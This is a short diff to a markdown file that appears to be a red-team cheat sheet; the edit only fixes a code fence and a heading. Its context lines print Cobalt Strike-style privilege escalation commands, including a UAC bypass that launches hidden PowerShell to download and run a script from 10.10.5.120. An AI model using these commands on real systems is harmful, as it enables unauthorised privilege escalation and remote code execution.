@@ -32,14 +32,14 @@ connect <IP> <PORT>
 ```
 
 #### UAC bypass
-````
+```
 elevate uac-token-duplication tcp-4444-local
 
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 connect localhost 4444
 ```
 
-####  elevate to system
+####  Elevate to system
 ```
 elevate svc-exe
 ```
